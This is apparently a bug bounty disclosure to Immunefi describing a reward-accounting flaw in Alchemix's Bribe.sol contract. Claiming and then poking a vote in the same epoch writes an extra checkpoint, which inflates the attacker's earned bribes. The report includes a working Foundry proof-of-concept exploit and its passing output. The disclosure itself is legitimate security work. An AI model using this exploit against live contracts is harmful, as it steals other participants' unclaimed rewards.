# 31223 - \[SC - Critical] Disproportionate Rewards Manipulation in Bribesol

Submitted on May 15th 2024 at 04:32:25 UTC by @Limbooo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31223

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

This report details a critical vulnerability found in the `Bribe.sol` contract, which allows participants to manipulate reward distributions through strategic voting and claims. This issue arises from improper handling of vote and reward calculations across epochs, enabling exploitation to unfairly increase individual rewards.

## Vulnerability Details

The vulnerability is primarily due to the lack of a robust system to handle the transition between voting epochs and the claiming of rewards. Specifically, the contract fails to adequately isolate the effects of voting actions within a single epoch, allowing the influence of actions like voting and claiming to spill over into subsequent epochs.

Actually, this vulnerability was covered while trying to proof another vulnerability. While it consumed to much time debugging to find the crux of the problem here, we found that when `Bribe::getRewardForOwner` called by `Voter` after user interact with `Voter::claimBribes`, it will write a checkpoint:

This issue was discovered while investigating another vulnerability. During the debugging process, it became apparent that when `Bribe::getRewardForOwner` is called by `Voter` contract after a user interacts with `Voter::claimBribes`, a checkpoint is written:

```solidity
src/Bribe.sol:
  283:     function getRewardForOwner(uint256 tokenId, address[] memory tokens) external lock {
  284:         require(msg.sender == voter, "not voter");
  285:         address _owner = IVotingEscrow(veALCX).ownerOf(tokenId);
  286:         uint256 length = tokens.length;
  287:         for (uint256 i = 0; i < length; i++) {
  288:             uint256 _reward = earned(tokens[i], tokenId);
  289: 
  290:             require(_reward > 0, "no rewards to claim");
  291: 
  292:             lastEarn[tokens[i]][tokenId] = block.timestamp;
  293: 
@>294:             _writeCheckpoint(tokenId, balanceOf[tokenId]);
  295: 
  296:             IERC20(tokens[i]).safeTransfer(_owner, _reward);
  297: 
  298:             emit ClaimRewards(_owner, tokens[i], _reward);
  299:         }
  300:     }

  351:     function _writeCheckpoint(uint256 tokenId, uint256 balance) internal {
  352:         uint256 _timestamp = block.timestamp;
  353:         uint256 _nCheckPoints = numCheckpoints[tokenId];
  354:         if (_nCheckPoints > 0 && checkpoints[tokenId][_nCheckPoints - 1].timestamp == _timestamp) {
  355:             checkpoints[tokenId][_nCheckPoints - 1].balanceOf = balance;
  356:         } else {
@>357:             checkpoints[tokenId][_nCheckPoints] = Checkpoint(_timestamp, balance);
  358:             numCheckpoints[tokenId] = _nCheckPoints + 1;
  359:         }
  360:     }
```

Additionally, when `Voter::poke` is called, it saves another checkpoint only if it is invoked at a different timestamp than the checkpoint saved during the claim. Consequently, when `Bribe::earned` starts calculating based on the first checkpoint index after the last epoch, it iterates over both checkpoints, leading to potential discrepancies and unintended influences across epochs.

## Impact Details

1. **Economic Incentive Disruption**: By exploiting this vulnerability, a user can claim an outsized portion of the rewards pool, potentially leaving insufficient funds for other participants.
2. **Resource Drainage**: Continuous exploitation of this vulnerability could lead to significant resource drainage, reducing the overall effectiveness and sustainability of the DAO.

## Proof of concept

### Test Case (Foundry)

The provided test demonstrates how the manipulation of voting weights and reward claims can lead to disproportionate reward allocation. The test involves two participants, Alice and Bob, where Bob manipulates the system to claim full rewards for an epoch by strategically timing his votes and claims. This test is critical for illustrating the practical exploitability of the vulnerability under realistic conditions.

#### Test Execution:

The test can be added to a new file under the current test suite `src/test/VotingPoC.t.sol`, then specify the file name in `FILE` flag under `Makefile` configuration. Run using `make test_file`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract VotingPoCTest is BaseTest {
    address public alice;
    address public bob;

    function setUp() public {
        setupContracts(block.timestamp);

        // Setup Alice and Bob addresses
        alice = vm.addr(uint256(keccak256(abi.encodePacked('Alice'))));
        vm.label(alice, 'Alice');
        bob = vm.addr(uint256(keccak256(abi.encodePacked('Bob'))));
        vm.label(alice, 'Bob');
    }

    function testTheftOfUnclaimedBribes() public {
        uint256 period = minter.activePeriod();
        hevm.warp(period + 1 days);

        uint256 aliceTokenId = createVeAlcx(alice, TOKEN_1, 1, true);
        uint256 bobTokenId = createVeAlcx(bob, TOKEN_1, 1, true);

        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;


        // Reward amount
        uint256 rewardAmount = TOKEN_100K;
        // Notify bribe for reward amount
        createThirdPartyBribe(bribeAddress, bal, rewardAmount);

        // Alice Vote
        hevm.prank(alice);
        voter.vote(aliceTokenId, pools, weights, 0);
        // Bob Vote
        hevm.prank(bob);
        voter.vote(bobTokenId, pools, weights, 0);

        // Next epoch started
        hevm.warp(period + 2 weeks + 1 );
        voter.distribute();

        // Bob and Alice  rewarded  half of the reward each
        assertEq(IBribe(bribeAddress).earned(bal, bobTokenId), rewardAmount/2);
        assertEq(IBribe(bribeAddress).earned(bal, aliceTokenId), rewardAmount/2);

        hevm.warp(period + 2 weeks + 1 days );

        // Alice referesh his vote statues
        hevm.prank(alice);
        voter.poke(aliceTokenId);


        // Bob did not like that alice sharing with him half of the full reward
        // He decided to trick the calculation of this epoch to steal Alice reward
        // First he claim his bribe, this will save a new checkpoint for his veALCX
        hevm.prank(bob);
        voter.claimBribes(bribes, tokens, bobTokenId);
        // Then. after 1 secound he poke his vote to be updated in another checkpoint
        hevm.warp(period + 2 weeks + 1 days + 1 seconds);
        hevm.prank(bob);
        voter.poke(bobTokenId);

        // Notify bribe for reward amount in this wpoch
        createThirdPartyBribe(bribeAddress, bal, rewardAmount);


        // Next epoch started
        hevm.warp(period + 4 weeks + 1);
        voter.distribute();

        // Now Alice has the right earned amount, 2 * half of reward amount (first epoch reward + secound)
        assertEq(IBribe(bribeAddress).earned(bal, aliceTokenId), (rewardAmount/2) * 2);

        // Since Bob has claim the reward of the first epoch,
        // He should earn only half of the reward of the secound epoch
        // But he the system gives him the full reward amount
        assertEq(IBribe(bribeAddress).earned(bal, bobTokenId), rewardAmount);


        // However, bribe contract will not be able to conver all earned rewards now
        uint256 aliceEarned = IBribe(bribeAddress).earned(bal, aliceTokenId);
        uint256 bobEarned = IBribe(bribeAddress).earned(bal, bobTokenId);
        assertGe(
            aliceEarned + bobEarned,
            IERC20(bal).balanceOf(bribeAddress)
        );

        // If Bob claim bribe before Alice, Alice will not be able to claim his bribe
        hevm.prank(bob);
        voter.claimBribes(bribes, tokens, bobTokenId);
        // when he try the call will revert with
        hevm.expectRevert(abi.encodePacked("ERC20: transfer amount exceeds balance"));
        hevm.prank(alice);
        voter.claimBribes(bribes, tokens, aliceTokenId);
    }
}
```

#### Test Output

```bash
alchemix-v2-dao main* 1m17s
❯ make test_file
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/*** --match-path src/test/VotingPoC.t.sol -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/VotingPoC.t.sol:VotingPoCTest
[PASS] testTheftOfUnclaimedBribes() (gas: 5667267)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 65.12s (52.86s CPU time)

Ran 1 test suite in 66.38s (65.12s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
